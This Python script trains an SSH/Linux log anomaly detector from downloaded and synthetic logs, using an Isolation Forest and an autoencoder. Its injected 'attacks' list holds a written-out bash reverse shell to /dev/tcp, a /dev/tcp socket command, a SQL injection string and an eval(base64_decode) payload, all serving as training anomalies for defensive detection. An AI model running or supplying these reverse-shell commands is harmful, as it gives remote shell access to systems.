import sys
import os
import urllib.request
import pandas as pd
import numpy as np
import joblib
import random
import re
import torch
import torch.nn as nn
import torch.optim as optim
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
from rich.console import Console
from rich.progress import track

# Setup path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import config

console = Console()

# --- CONFIG ---
URLS = {
    "OpenSSH": "https://raw.githubusercontent.com/logpai/loghub/master/OpenSSH/OpenSSH_2k.log",
    "Linux": "https://raw.githubusercontent.com/logpai/loghub/master/Linux/Linux_2k.log"
}
MODEL_DIR = "models"
TARGET_SIZE = 60000  # 60k samples

# --- 1. DEFINITIONS ---
class LogAutoencoder(nn.Module):
    def __init__(self, input_dim):
        super(LogAutoencoder, self).__init__()
        self.encoder = nn.Sequential(
            nn.Linear(input_dim, 16), nn.Tanh(),
            nn.Linear(16, 8), nn.Tanh(),
            nn.Linear(8, 4)
        )
        self.decoder = nn.Sequential(
            nn.Linear(4, 8), nn.Tanh(),
            nn.Linear(8, 16), nn.Tanh(),
            nn.Linear(16, input_dim)
        )
    def forward(self, x):
        return self.decoder(self.encoder(x))

def preprocess_log(line):
    # Clean log for NLP
    line = re.sub(r'^\w{3}\s+\d+\s+\d+:\d+:\d+\s+', '', line) # Date
    line = re.sub(r'^[\w\-]+\s+[\w\[\]]+:\s+', '', line) # Process
    line = re.sub(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', 'IP_ADDR', line) # IP
    line = re.sub(r'\d+', 'NUM', line) # Numbers
    return line.strip()

def extract_stats_features(log_line):
    # Extract features for Autoencoder
    s = str(log_line).strip()
    l = len(s)
    if l == 0: return [0, 0, 0]
    prob = [float(s.count(c)) / l for c in dict.fromkeys(list(s))]
    entropy = -sum([p * np.log2(p) for p in prob])
    digits = sum(c.isdigit() for c in s)
    return [l, entropy, digits]

def generate_random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

# --- 2. DATA PIPELINE ---
def get_combined_dataset():
    raw_logs = []
    os.makedirs("data", exist_ok=True)
    
    # Download & Load Real Data
    for name, url in URLS.items():
        path = os.path.join("data", f"{name}_2k.log")
        if not os.path.exists(path):
            console.print(f"[yellow]Downloading {name} dataset...[/yellow]")
            urllib.request.urlretrieve(url, path)
        
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            raw_logs.extend([line.strip() for line in f])

    console.print(f"[blue]Loaded {len(raw_logs)} real logs. Augmenting to {TARGET_SIZE}...[/blue]")
    
    # Data Augmentation (Tạo thêm log giả lập)
    augmented_logs = list(raw_logs)
    templates = [
        "Accepted password for {user} from {ip} port {port} ssh2",
        "Failed password for {user} from {ip} port {port} ssh2",
        "Connection closed by {ip} port {port} [preauth]",
        "Invalid user {user} from {ip}",
        "kernel: [NUM.NUM] iptables denied: IN=eth0 OUT= MAC=... SRC={ip} DST={ip}",
        "su(pam_unix)[NUM]: session opened for user {user} by (uid=0)"
    ]
    users = ['root', 'admin', 'user', 'deploy', 'guest']

    while len(augmented_logs) < TARGET_SIZE * 0.9:
        tmpl = random.choice(templates)
        log = tmpl.format(
            user=random.choice(users),
            ip=generate_random_ip(),
            port=random.randint(1024, 65535)
        )
        augmented_logs.append(log)

    # Inject Attacks (10%)
    attacks = [
        "Failed password for invalid user admin' OR '1'='1 from {ip}", 
        "Did not receive identification string from {ip}",
        "error: maximum authentication attempts exceeded for root from {ip}",
        "POSSIBLE BREAK-IN ATTEMPT! from {ip}",
        "sh -c 'exec 5<>/dev/tcp/{ip}/8080'",
        "eval(base64_decode('Zm9v...'))",
        "/bin/sh -i >& /dev/tcp/{ip}/4444 0>&1",
        "User root from {ip} not allowed because not listed in AllowUsers"
    ]
    for _ in range(int(TARGET_SIZE * 0.1)):
        tmpl = random.choice(attacks)
        augmented_logs.append(tmpl.format(ip=generate_random_ip()))
        
    return augmented_logs

# --- 3. TRAIN PROCESS ---
def train_all():
    os.makedirs(MODEL_DIR, exist_ok=True)
    logs = get_combined_dataset()
    
    # === TRAIN NLP MODEL (Isolation Forest) ===
    console.print("[bold cyan]>>> Training Layer 1: NLP Model (Semantics)[/bold cyan]")
    clean_logs = [preprocess_log(l) for l in logs]
    
    vectorizer = TfidfVectorizer(max_features=500, stop_words='english')
    X_nlp = vectorizer.fit_transform(clean_logs)
    
    nlp_model = IsolationForest(contamination=0.1, random_state=42, n_jobs=-1)
    nlp_model.fit(X_nlp)
    
    joblib.dump(vectorizer, os.path.join(MODEL_DIR, "tfidf_vectorizer.pkl"))
    joblib.dump(nlp_model, os.path.join(MODEL_DIR, "nlp_iso_forest.pkl"))
    console.print("[green]NLP Model Saved.[/green]")

    # === TRAIN DEEP MODEL (Autoencoder) ===
    console.print("[bold cyan]>>> Training Layer 2: Autoencoder (Structure)[/bold cyan]")
    stats_features = [extract_stats_features(l) for l in logs]
    
    scaler = StandardScaler()
    X_stats = scaler.fit_transform(stats_features)
    
    # Train only on Normal-looking data (assume first 80% is somewhat normal after shuffle)
    # Trong thực tế cần label, nhưng ở đây ta dùng giả định Augmented
    random.shuffle(X_stats)
    X_train = torch.tensor(X_stats[:int(TARGET_SIZE*0.8)], dtype=torch.float32)
    X_test = torch.tensor(X_stats[int(TARGET_SIZE*0.8):], dtype=torch.float32)

    model = LogAutoencoder(input_dim=3)
    criterion = nn.MSELoss()
    optimizer = optim.Adam(model.parameters(), lr=0.01)

    # Train loop
    epochs = 30
    for epoch in track(range(epochs), description="Deep Learning"):
        model.train()
        optimizer.zero_grad()
        output = model(X_train)
        loss = criterion(output, X_train)
        loss.backward()
        optimizer.step()

    # Find Threshold
    model.eval()
    with torch.no_grad():
        recons = model(X_test)
        mse = torch.mean((X_test - recons)**2, dim=1).numpy()
    
    threshold = np.percentile(mse, 95) # 95th percentile
    
    # Save
    torch.save(model.state_dict(), os.path.join(MODEL_DIR, "autoencoder.pth"))
    joblib.dump(scaler, os.path.join(MODEL_DIR, "scaler.pkl"))
    with open(os.path.join(MODEL_DIR, "threshold.txt"), "w") as f:
        f.write(str(threshold))
        
    console.print(f"[green]Autoencoder Saved. Threshold: {threshold:.6f}[/green]")
    console.print("[bold green]ALL MODELS TRAINED SUCCESSFULLY![/bold green]")

if __name__ == "__main__":
    train_all()